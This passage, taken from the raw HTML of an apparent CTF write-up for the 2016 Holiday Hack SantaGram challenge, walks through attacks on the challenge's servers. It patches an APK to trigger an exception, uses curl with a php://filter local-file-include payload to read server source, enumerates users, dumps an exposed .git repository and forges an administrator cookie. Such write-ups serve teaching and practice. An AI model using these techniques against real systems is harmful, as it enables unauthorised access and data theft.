class=\"o\">.</span><span class=\"na\">getNativeHeapAllocatedSize</span><span class=\"o\">()));</span>\n<span class=\"mi\">154</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"cpuusage\"</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">C0987b</span><span class=\"o\">.</span><span class=\"na\">m4769a</span><span class=\"o\">()));</span></code></pre> \n</figure> \n<p>Some function called <code class=\"highlighter-rouge\">m4775a</code> uses this host string. Now to find out where this function is used.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag <span class=\"sb\">m4775a</span>\ncom/northpolewonderland/santagram/C986b.java\n136:  public static void <span class=\"sb\">m4775a</span>(Context context, Throwable th) {\n\ncom/northpolewonderland/santagram/PostDetails.java\n70:   C0987b.<span class=\"sb\">m4775a</span>(this.f2561b.getApplication(), th);\n\ncom/northpolewonderland/santagram/SplashScreen.java\n35:   C0987b.<span class=\"sb\">m4774a</span>(this.f2612a.getApplicationContext(), th);\n</code></pre> \n</figure> \n<p>The <code class=\"highlighter-rouge\">PostDetails</code> action looks interesting. What context is being used here?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag -C 12 m4775a com/northpolewonderland/santagram/PostDetails.java\n</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"cm\">/* renamed from: com.northpolewonderland.santagram.PostDetails.1 */</span>\n<span class=\"kd\">class</span> <span class=\"nc\">C09411</span> <span class=\"kd\">implements</span> <span class=\"n\">UncaughtExceptionHandler</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">UncaughtExceptionHandler</span> <span class=\"n\">f2560a</span><span class=\"o\">;</span>\n    <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">PostDetails</span> <span class=\"n\">f2561b</span><span class=\"o\">;</span>\n\n    <span class=\"n\">C09411</span><span class=\"o\">(</span><span class=\"n\">PostDetails</span> <span class=\"n\">postDetails</span><span class=\"o\">,</span> <span class=\"n\">UncaughtExceptionHandler</span> <span class=\"n\">uncaughtExceptionHandler</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2561b</span> <span class=\"o\">=</span> <span class=\"n\">postDetails</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2560a</span> <span class=\"o\">=</span> <span class=\"n\">uncaughtExceptionHandler</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">uncaughtException</span><span class=\"o\">(</span><span class=\"n\">Thread</span> <span class=\"n\">thread</span><span class=\"o\">,</span> <span class=\"n\">Throwable</span> <span class=\"n\">th</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">C0987b</span><span class=\"o\">.</span><span class=\"na\">m4775a</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2561b</span><span class=\"o\">.</span><span class=\"na\">getApplication</span><span class=\"o\">(),</span> <span class=\"n\">th</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2560a</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2560a</span><span class=\"o\">.</span><span class=\"na\">uncaughtException</span><span class=\"o\">(</span><span class=\"n\">thread</span><span class=\"o\">,</span> <span class=\"n\">th</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">exit</span><span class=\"o\">(</span><span class=\"mi\">2</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre> \n</figure> \n<p>Ah, so this is an <code class=\"highlighter-rouge\">Unexpected Exception</code> handler. Assuming an unexpected exception occurs, traffic is sent to the exception server. Now we just need to find where this handler is used to discover if we can force an exception.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag C09411\ncom/northpolewonderland/santagram/PostDetails.java\n61:  class C09411 implements UncaughtExceptionHandler {\n65:     C09411(PostDetails postDetails, UncaughtExceptionHandler uncaughtExceptionHandler) {\n604:    Thread.setDefaultUncaughtExceptionHandler(new C09411(this, Thread.getDefaultUncaughtExceptionHandler()));\n\n<span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag -C5 <span class=\"sb\">C09411</span>\ncom/northpolewonderland/santagram/PostDetails.java\n602-    protected void onCreate(Bundle bundle) {\n603-        super.onCreate(bundle);\n            // Handler is set here\n604:        Thread.setDefaultUncaughtExceptionHandler(\n                new <span class=\"sb\">C09411</span>(this, Thread.getDefaultUncaughtExceptionHandler()));\n605-        setContentView(2130968634);\n606-        super.setRequestedOrientation(1);\n</code></pre> \n</figure> \n<p>Now we see the UncaughtExceptionHandler is used in <code class=\"highlighter-rouge\">PostDetails</code>. Let’s look for a place where an Exception might not be handled.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ ag -C8 try com/northpolewonderland/santagram/PostDetails.java\n</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"> <span class=\"k\">try</span> <span class=\"o\">{</span>\n      <span class=\"n\">bitmap</span> <span class=\"o\">=</span> <span class=\"n\">BitmapFactory</span><span class=\"o\">.</span><span class=\"na\">decodeStream</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">URL</span><span class=\"o\">(</span><span class=\"n\">strArr</span><span class=\"o\">[</span><span class=\"mi\">0</span><span class=\"o\">]).</span><span class=\"na\">openStream</span><span class=\"o\">());</span>\n <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">Exception</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n      <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">e</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2590b</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165204</span><span class=\"o\">),</span> <span class=\"s\">\"downloadImageTask error: \"</span> <span class=\"o\">+</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">getMessage</span><span class=\"o\">());</span>\n      <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n <span class=\"o\">}</span>\n\n <span class=\"k\">try</span> <span class=\"o\">{</span>\n     <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">postObj</span><span class=\"o\">.</span><span class=\"na\">fetchIfNeeded</span><span class=\"o\">().</span><span class=\"na\">getParseObject</span><span class=\"o\">(</span><span class=\"n\">Configs</span><span class=\"o\">.</span><span class=\"na\">POSTS_CLASSE_NAME</span><span class=\"o\">);</span>\n     <span class=\"n\">showPostDetails</span><span class=\"o\">();</span>\n     <span class=\"n\">queryFollow</span><span class=\"o\">();</span>\n     <span class=\"n\">queryLikeStatus</span><span class=\"o\">();</span>\n <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">ParseException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n     <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n <span class=\"o\">}</span></code></pre> \n</figure> \n<p>Here we see two try/catch blocks. The first block actually catches all exceptions via <code class=\"highlighter-rouge\">catch (Exception e)</code>. This block probably won’t be valuble for us.</p> \n<p>The second block though, only catches <code class=\"highlighter-rouge\">ParseException</code>. If we can cause something other than a <code class=\"highlighter-rouge\">ParseException</code> to occur, maybe we can trigger our wanted function.</p> \n<p>Let’s dive a bit deeper into <code class=\"highlighter-rouge\">showPostDetails()</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"kt\">void</span> <span class=\"nf\">showPostDetails</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">postObj</span><span class=\"o\">.</span><span class=\"na\">getParseObject</span><span class=\"o\">(</span><span class=\"n\">Configs</span><span class=\"o\">.</span><span class=\"na\">POSTS_USER_POINTER</span><span class=\"o\">).</span><span class=\"na\">fetchIfNeededInBackground</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">C09617</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">));</span>\n<span class=\"o\">}</span></code></pre> \n</figure> \n<p>So we are getting a Parse Object via some <code class=\"highlighter-rouge\">Configs</code> option. Let’s look at where this <code class=\"highlighter-rouge\">Configs</code> option is set.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">ag <span class=\"sb\">POSTS_USER_POINTER</span>\ncom/northpolewonderland/santagram/Configs.java\n37:    public static String POSTS_USER_POINTER;\n69:        <span class=\"sb\">POSTS_USER_POINTER</span> = \"postUser\";\n</code></pre> \n</figure> \n<p>Oh shoot, this is the source code from <code class=\"highlighter-rouge\">jadx</code>. What does this Config look like in the decoded smali code from <code class=\"highlighter-rouge\">apktool</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ ag <span class=\"sb\">postUser</span>\nsmali/com/northpolewonderland/santagram/Configs.smali\n225:    const-string v0, \"<span class=\"sb\">postUser</span>\"\n</code></pre> \n</figure> \n<p>So smali is an assembler for the DEX format used by Android’s VM. We want to edit this smali code to try and force an exception. Let’s make an hypothesis to test that if we provide a <code class=\"highlighter-rouge\">POSTS_USER_POINTER</code> that the application wasn’t expecting, then an exception will occur. Let’s change the <code class=\"highlighter-rouge\">Configs.smali</code> with a string that the application probably isn’t expecting.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ ag postUser\nsmali/com/northpolewonderland/santagram/Configs.smali\n225:    const-string v0, \"<span class=\"sb\">postUserAAAAAAAAAAAAAAAAAA</span>\"\n</code></pre> \n</figure> \n<p>We can follow the same procedure as the debug server to rebuild and resign the patched APK before uploading it to our local Genymotion VM. After uploading the APK and looking at Posts on the application, we see the following in Charles.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/ex.png\" alt=\"ex.png\" /></p> \n<p>Awesome! We got an exception to occur and recorded the traffic sent to the server. It looks like there is crashdump file created and sent back in the response. Let’s grab that to see if anything special is in it.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ wget http://ex.northpolewonderland.com/docs/<span class=\"sb\">crashdump-5zzbdA.php</span>\n--2016-12-26 14:15:20--  http://ex.northpolewonderland.com/docs/crashdump-5zzbdA.php\nResolving ex.northpolewonderland.com (ex.northpolewonderland.com)... 104.154.196.33\nConnecting to ex.northpolewonderland.com (ex.northpolewonderland.com)|104.154.196.33|:80... connected.\nHTTP request sent, awaiting response... <span class=\"sb\">500 Internal Server Error</span>\n2016-12-26 14:15:20 ERROR 500: Internal Server Error.\n</code></pre> \n</figure> \n<p>Ok, so it won’t be that easy ;-) Let’s try to fiddle with the request to see if we can prompt a different response from the server. Charles makes this easy by allowing us to copy the request in cURL format. Let’s begin with the operation field.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ curl -H 'Content-Type: application/json' -H 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; Custom Phone - 5.0.0 - API 21 - 768x1280 Build/LRX21M)' -H 'Host: ex.northpolewonderland.com' --data-binary \"{\\\"operation\\\":\\\"<span class=\"sb\">NotARealOperation</span>\\\",\\\"data\\\":{\\\"message\\\":\\\n...\n'http://ex.northpolewonderland.com/exception.php'                           \nFatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\n</code></pre> \n</figure> \n<p>Ah nice! So we now know there are two possible operations: <code class=\"highlighter-rouge\">WriteCrashDump</code> and <code class=\"highlighter-rouge\">ReadCrashDump</code>. Let’s see what the <code class=\"highlighter-rouge\">ReadCrashDump</code> operation does for us.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ curl -H 'Content-Type: application/json' --data-binary \"{\\\"operation\\\":\\\"<span class=\"sb\">ReadCrashDump</span>\\\",\\\"data\\\":{}}\" --compressed 'http://ex.northpolewonderland.com/exception.php'\n\n<span class=\"sb\">Fatal error! JSON key 'crashdump' must be set.</span>  </code></pre> \n</figure> \n<p>Alright, so we need a <code class=\"highlighter-rouge\">crashdump</code> attribute set. Let’s use our crashdump file returned in the response of our original exception.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ curl -H 'Content-Type: application/json' --data-binary \"{\\\"operation\\\":\\\"ReadCrashDump\\\",\\\"data\\\":<span class=\"sb\">{\\\"crashdump\\\":\\\"crashdump-5zzbdA.php\\\"}</span>}\" --compressed 'http://ex.northpolewonderland.com/exception.php' \n\n<span class=\"sb\">Fatal error! crashdump value duplicate '.php' extension detected.</span>\n</code></pre> \n</figure> \n<p>Oh, weird.. so the server auto appends <code class=\"highlighter-rouge\">.php</code> for us.. This could remind us of <a href=\"https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities\">a blog post</a> a little birdie told us about. We could possibly use a PHP Filter to read our the crashdump file instead.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"> curl -H 'Content-Type: application/json' --data-binary \"{\\\"operation\\\":\\\"ReadCrashDump\\\",\\\"data\\\":{\\\"crashdump\\\":\\\"<span class=\"sb\">php://filter/convert.base64-encode/resource=crashdump-5zzbdA</span>\\\", \\\"folder\\\":\\\"docs\\\"}}\" --compressed 'http://ex.northpolewonderland.com/exception.php' | base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2158    0  2028  100   130  15521    994 --:--:-- --:--:-- --:--:-- 15480\n&lt;\\?php print('{\n    \"message\": \"Attempt to invoke virtual method 'void com.parse.P...\",\n    \"lmessage\": \"Attempt to invoke virtual method 'void com.parse.P...\",\n    \"strace\": \"...\",\n</code></pre> \n</figure> \n<p>Ah cool! So we can return the source of our crashdump. Sadly, there wasn’t anything new from this file. There was one other file though on the exception server: <code class=\"highlighter-rouge\">exception.php</code> itself. Could we replace our crashdump file with the <code class=\"highlighter-rouge\">exception.php</code> to see what it has in it?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">curl -H 'Content-Type: application/json' --data-binary \"{\\\"operation\\\":\\\"ReadCrashDump\\\",\\\"data\\\":{\\\"crashdump\\\":\\\"<span class=\"sb\">php://filter/convert.base64-encode/resource=exception</span>\\\", \\\"folder\\\":\\\"docs\\\"}}\" --compressed 'http://ex.northpolewonderland.com/exception.php' | base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1759    0  1636  100   123   6753    507 --:--:-- --:--:-- --:--:--  6760\n&lt;\\?php \n\n# Audio file from Discombobulator in webroot: <span class=\"sb\">discombobulated-audio-6-XyzE3N9YqKNH.mp3</span>\n</code></pre> \n</figure> \n<p>And it works! And lookie there.. we have the path to our next audio file: <code class=\"highlighter-rouge\">discombobulated-audio-6-XyzE3N9YqKNH.mp3</code>. As always, a simple <code class=\"highlighter-rouge\">wget</code> can retrieve the audio file. We are ready to tackle the final server!</p> \n<h3 id=\"76-the-mobile-analytics-server-post-authentication\">7.6) The Mobile Analytics Server (post authentication)</h3> \n<h4 id=\"administrator-access\">Administrator access</h4> \n<p>Ports relevant for the Analytics Server (analytics.northpolewonderland.com):</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>PORT      STATE    SERVICE\n80/tcp    open     http\n</code></pre> \n </div> \n</div> \n<p>A typical good idea when tackling a new web application is to record as much traffic as we can and then analyze it offline. We can use <a href=\"https://portswigger.net/burp/\">Burp Suite</a> to proxy our traffic for us. After setting our proxy settings in our browser to 127.0.0.1:8080. We can begin exploring the application.</p> \n<p>The main functionality is to query a database for various report entries. There is also a functionality to save a query in a report which we can look at later via the report uuid.</p> \n<p>After recording traffic from as much of the application that we have access to via our <code class=\"highlighter-rouge\">guest</code> account, we can begin replaying various requests in Burp. One of the initial cases would be the login request. Let’s try a different username. What we are looking for is different messages from the server in order to implicitly gain information about users.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics1.gif\" alt=\"analytics1.gif\" /></p> \n<p>Just from these repsonses, we know that if a valid user, but incorrect password is given, a response of <code class=\"highlighter-rouge\">Bad password!</code> is returned. This means implicitly that the usernme given was correct. Hence, we know that <code class=\"highlighter-rouge\">administrator</code> is a valid user in the database. A few password guesses (<code class=\"highlighter-rouge\">Password1!</code>, <code class=\"highlighter-rouge\">Fall2016</code>, <code class=\"highlighter-rouge\">yummycookies</code>) proved to not work, but we still have this new piece of information.</p> \n<p>While looking at the <code class=\"highlighter-rouge\">query.php</code> POST request, we notice we can receive an interesting SQL error message from the server.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics2.gif\" alt=\"analytics2.gif\" /></p> \n<p>Looks like whatever type we query for, this is inserted into a <code class=\"highlighter-rouge\">SELECT</code> statement looking for the table <code class=\"highlighter-rouge\">app_OURTHING_report</code>. While this is intriguing at first, it seems to be hard to leverage into any sort of information leakage.</p> \n<p>One common occurance for web application is for developers to accidently push their code repository into production. Is there any sort of code repository available?</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics3.gif\" alt=\"analytics3.gif\" /></p> \n<p>Fantastic! So we have access to the <code class=\"highlighter-rouge\">.git</code> repo. We can now clone the repo and reset the directory to extract the objects from the repository itself.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/3m77v4mmxnljvse48f29gkdss.js\" id=\"asciicast-3m77v4mmxnljvse48f29gkdss\" async=\"\"></script> \n<p>Great, now we can search through the source code of the application. Since we know there is an <code class=\"highlighter-rouge\">administrator</code> user, let’s see how user’s are authenticated. Looking back over the request, we notice there is an <code class=\"highlighter-rouge\">AUTH</code> cookie.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-ruby\" data-lang=\"ruby\"><span class=\"no\">Cookie</span><span class=\"p\">:</span> <span class=\"no\">AUTH</span><span class=\"o\">=</span><span class=\"mi\">82532</span><span class=\"n\">b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c80b97fee8bca62882fb78be7cc4990553b14348637bec</span></code></pre> \n</figure> \n<p>Let’s look for how this <code class=\"highlighter-rouge\">AUTH</code> cookie is generated.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"err\">$</span> <span class=\"nx\">ag</span> <span class=\"o\">-</span><span class=\"nx\">C5</span> <span class=\"nx\">AUTH</span>                                                                                                   \n<span class=\"nx\">login</span><span class=\"o\">.</span><span class=\"nx\">php</span>\n\n<span class=\"o\">&lt;?</span><span class=\"nx\">php</span>\n<span class=\"o\">...</span>\n    <span class=\"nv\">$auth</span> <span class=\"o\">=</span> <span class=\"nx\">encrypt</span><span class=\"p\">(</span><span class=\"nb\">json_encode</span><span class=\"p\">([</span>\n      <span class=\"s1\">'username'</span> <span class=\"o\">=&gt;</span> <span class=\"nv\">$_POST</span><span class=\"p\">[</span><span class=\"s1\">'username'</span><span class=\"p\">],</span>\n      <span class=\"s1\">'date'</span> <span class=\"o\">=&gt;</span> <span class=\"nb\">date</span><span class=\"p\">(</span><span class=\"nx\">DateTime</span><span class=\"o\">::</span><span class=\"na\">ISO8601</span><span class=\"p\">),</span>\n    <span class=\"p\">]));</span>\n\n    <span class=\"nb\">setcookie</span><span class=\"p\">(</span><span class=\"s1\">'AUTH'</span><span class=\"p\">,</span> <span class=\"nb\">bin2hex</span><span class=\"p\">(</span><span class=\"nv\">$auth</span><span class=\"p\">));</span>\n\n    <span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s1\">'Location: index.php?msg=Successfully%20logged%20in!'</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>So the <code class=\"highlighter-rouge\">AUTH</code> cookie is a json blob with <code class=\"highlighter-rouge\">username</code> and <code class=\"highlighter-rouge\">date</code> keys. This blob is then encrypted via some encryption function. Is there also a decrypt function somewhere?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"err\">$</span> <span class=\"nx\">ag</span> <span class=\"o\">-</span><span class=\"nx\">C8</span> <span class=\"nx\">decrypt</span>\n<span class=\"nx\">db</span><span class=\"o\">.</span><span class=\"nx\">php</span>\n\n<span class=\"o\">&lt;?</span><span class=\"nx\">php</span> \n<span class=\"k\">function</span> <span class=\"nf\">get_username</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nb\">isset</span><span class=\"p\">(</span><span class=\"nv\">$_COOKIE</span><span class=\"p\">[</span><span class=\"s1\">'AUTH'</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"c1\">// Decrypt function in use\n</span>  <span class=\"nv\">$auth</span> <span class=\"o\">=</span> <span class=\"nb\">json_decode</span><span class=\"p\">(</span><span class=\"nx\">decrypt</span><span class=\"p\">(</span><span class=\"nb\">pack</span><span class=\"p\">(</span><span class=\"s2\">\"H*\"</span><span class=\"p\">,</span><span class=\"nv\">$_COOKIE</span><span class=\"p\">[</span><span class=\"s1\">'AUTH'</span><span class=\"p\">])),</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return</span> <span class=\"nv\">$auth</span><span class=\"p\">[</span><span class=\"s1\">'username'</span><span class=\"p\">];</span>\n<span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>Just to make confirm our hypothesis, let’s try to decrypt our current <code class=\"highlighter-rouge\">AUTH</code> cookie.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n<span class=\"k\">require_once</span><span class=\"p\">(</span><span class=\"s1\">'crypto.php'</span><span class=\"p\">);</span>\n\n<span class=\"c1\">// $auth = json_decode(decrypt(pack(\"H*\", $a)), true);\n</span><span class=\"nv\">$a</span> <span class=\"o\">=</span> <span class=\"s2\">\"82532b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c80b97fee8bca72880fd78bf7bc49a0853b14348637bec\"</span><span class=\"p\">;</span>\n<span class=\"k\">print</span> <span class=\"nx\">decrypt</span><span class=\"p\">(</span><span class=\"nb\">pack</span><span class=\"p\">(</span><span class=\"s2\">\"H*\"</span><span class=\"p\">,</span> <span class=\"nv\">$a</span><span class=\"p\">));</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ php unpack-auth.php \n{\"username\":\"guest\",\"date\":\"2016-12-27T05:43:09+0000\"}\n</code></pre> \n</figure> \n<p>Now that we know our <code class=\"highlighter-rouge\">AUTH</code> cookie is set for the <code class=\"highlighter-rouge\">guest</code> user, let’s try to make a new cookie for the <code class=\"highlighter-rouge\">administrator</code> user that we know exists from our earlier testing.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n<span class=\"k\">require_once</span><span class=\"p\">(</span><span class=\"s1\">'crypto.php'</span><span class=\"p\">);</span>\n\n<span class=\"nv\">$b</span> <span class=\"o\">=</span> <span class=\"s1\">'{\"username\":\"administrator\",\"date\":\"2016-12-27T05:43:09+0000\"}'</span><span class=\"p\">;</span>\n<span class=\"k\">print</span> <span class=\"nb\">bin2hex</span><span class=\"p\">(</span><span class=\"nx\">encrypt</span><span class=\"p\">(</span><span class=\"nv\">$b</span><span class=\"p\">));</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ php repack-auth.php \n82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9d6548b4494c6063a10a63b71976884152\n</code></pre> \n</figure> \n<p>In order to test our new cookie, let’s look to see if there is any new functionality that is only accessed via the <code class=\"highlighter-rouge\">administrator</code> account.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">ag -C5 admin\nheader.php\nif (get_username() == 'administrator') {\n  ?&gt;\n    &lt;li&gt;&lt;a href=\"<span class=\"sb\">/edit.php</span>\"&gt;Edit&lt;/a&gt;&lt;/li&gt;\n  &lt;?php\n}\n</code></pre> \n</figure> \n<p>Ok, so we need to send a request <code class=\"highlighter-rouge\">/edit.php</code> with our new <code class=\"highlighter-rouge\">AUTH</code> cookie. If this request sends a valid response, we know our new cookie succeeds.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics4.gif\" alt=\"analytics4.gif\" /></p> \n<p>And now we have access to this edit feature as <code class=\"highlighter-rouge\">administrator</code>.</p> \n<h4 id=\"retrieving-the-treasure\">Retrieving the treasure</h4> \n<p>Now that we have our <code class=\"highlighter-rouge\">administrator</code> access, it is time to figure out how we can leverage this <code class=\"highlighter-rouge\">edit.php</code> page to find our last audio file.</p> \n<p>This <code class=\"highlighter-rouge\">edit.php</code> page can modify the name and description of any given report. Let’s look exactly how this works in the script.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">else</span>\n  <span class=\"p\">{</span>\n    <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_query</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"s2\">\"SELECT * FROM `reports` WHERE `id`='\"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_real_escape_string</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">'id'</span><span class=\"p\">])</span> <span class=\"o\">.</span> <span class=\"s2\">\"' LIMIT 0, 1\"</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nv\">$result</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">reply</span><span class=\"p\">(</span><span class=\"mi\">500</span><span class=\"p\">,</span> <span class=\"s2\">\"MySQL Error: \"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_error</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">));</span>\n      <span class=\"k\">die</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n    <span class=\"nv\">$row</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_fetch_assoc</span><span class=\"p\">(</span><span class=\"nv\">$result</span><span class=\"p\">);</span>\n\n    <span class=\"c1\"># Update the row with the new values\n</span>    <span class=\"nv\">$set</span> <span class=\"o\">=</span> <span class=\"p\">[];</span>\n    <span class=\"k\">foreach</span><span class=\"p\">(</span><span class=\"nv\">$row</span> <span class=\"k\">as</span> <span class=\"nv\">$name</span> <span class=\"o\">=&gt;</span> <span class=\"nv\">$value</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">print</span> <span class=\"s2\">\"Checking for \"</span> <span class=\"o\">.</span> <span class=\"nb\">htmlentities</span><span class=\"p\">(</span><span class=\"nv\">$name</span><span class=\"p\">)</span> <span class=\"o\">.</span> <span class=\"s2\">\"...&lt;br&gt;\"</span><span class=\"p\">;</span>\n      <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nb\">isset</span><span class=\"p\">(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"nv\">$name</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n        <span class=\"k\">print</span> <span class=\"s1\">'Yup!&lt;br&gt;'</span><span class=\"p\">;</span>\n        <span class=\"nv\">$set</span><span class=\"p\">[]</span> <span class=\"o\">=</span> <span 